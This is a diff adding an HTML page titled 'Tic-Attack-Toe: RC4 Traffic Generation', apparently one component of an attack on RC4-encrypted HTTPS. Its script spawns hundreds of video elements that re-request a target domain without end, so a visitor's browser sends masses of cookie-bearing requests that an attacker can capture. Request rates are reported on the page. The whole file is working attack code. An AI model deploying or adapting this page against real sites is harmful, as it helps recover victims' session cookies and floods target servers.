@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Audio/video request making</title>
+	<style type="text/css">
+	input {
+		margin: 10px;
+	}
+	#baseUrl {
+		width: 350px;
+		line-height: 20px;
+		font-size: 15px;
+		padding: 10px;
+		
+	}
+
+	#num-els {
+		margin-bottom: 30px;
+	}
+
+	.btn {
+		background: #3498db;
+		background-image: -webkit-linear-gradient(top, #3498db, #2980b9);
+		background-image: -moz-linear-gradient(top, #3498db, #2980b9);
+		background-image: -ms-linear-gradient(top, #3498db, #2980b9);
+		background-image: -o-linear-gradient(top, #3498db, #2980b9);
+		background-image: linear-gradient(to bottom, #3498db, #2980b9);
+		-webkit-border-radius: 28;
+		-moz-border-radius: 28;
+		border-radius: 28px;
+		color: #ffffff;
+		font-size: 20px;
+		padding: 10px 20px 10px 20px;
+		text-decoration: none;
+		margin-top: 30px;
+
+	}
+
+	.btn:hover {
+		background: #3cb0fd;
+		background-image: -webkit-linear-gradient(top, #3cb0fd, #3498db);
+		background-image: -moz-linear-gradient(top, #3cb0fd, #3498db);
+		background-image: -ms-linear-gradient(top, #3cb0fd, #3498db);
+		background-image: -o-linear-gradient(top, #3cb0fd, #3498db);
+		background-image: linear-gradient(to bottom, #3cb0fd, #3498db);
+		text-decoration: none;
+	}
+
+	</style>
+</head>
+<body>
+	<h1>Tic-Attack-Toe: RC4 Traffic Generation (v1.05)</h1>
+	<form>
+		<input type="text" autocomplete="off" id="baseUrl" value="https://c.site.com"><br>
+		Number of audio/video elements: <input type="text" name="number" id="num-els" value="400"><br>
+		<a href="#" id="padding" class="btn">Set Padding</a>
+		<a href="#" id="start" class="btn">Start!</a>
+	</form>
+	<h2>Status</h2>
+	<pre id="speed">Estimated requests/sec: 0</pre>
+	<div id="status"><img src="https://i.imgur.com/pBOeQzN.gif" /></div>
+</body>
+<script type="text/javascript">
+var form = document.querySelector('form');
+var numrequests = 0;
+
+document.getElementById('start').addEventListener('click', function(e) {
+	run();
+	e.preventDefault();
+	return false;
+});
+
+document.getElementById('padding').addEventListener('click', function(e) {
+	var baseDomains = document.getElementById('baseUrl').value.split(',');
+	for (var i = 0; i < baseDomains.length; ++i) {
+		var video = document.createElement('video');
+		video.src = baseDomains[i] + "/init.php";
+	}
+
+	e.preventDefault();
+	return false;
+});
+
+function updateStatus(statusMsg) {
+	var div = document.getElementById("status");
+	div.innerHTML = statusMsg;
+}
+
+function videoOnError() {
+	numrequests++;
+	this.src = this.src;
+}
+
+function run() {
+	var NUM_ELEMENTS = parseInt(form.querySelector('input[name="number"]').value, 10);
+	var baseDomains = document.getElementById('baseUrl').value.split(',');
+
+	updateStatus('<img src="https://i.imgur.com/xEgvEZ3.png" />');
+	for (var i = 0; i < NUM_ELEMENTS; i++) {
+		var video = document.createElement('video');
+		video.onerror = videoOnError;
+		video.src = baseDomains[i % baseDomains.length] + "/lala.png";
+	}
+}
+
+function showRequests() {
+	var pre = document.getElementById("speed");
+	pre.textContent = "Estimated requests/sec: " + numrequests / 2;
+
+	numrequests = 0;
+	setTimeout(showRequests, 2000);
+}
+setTimeout(showRequests, 2000);
+
+</script>
+</html>
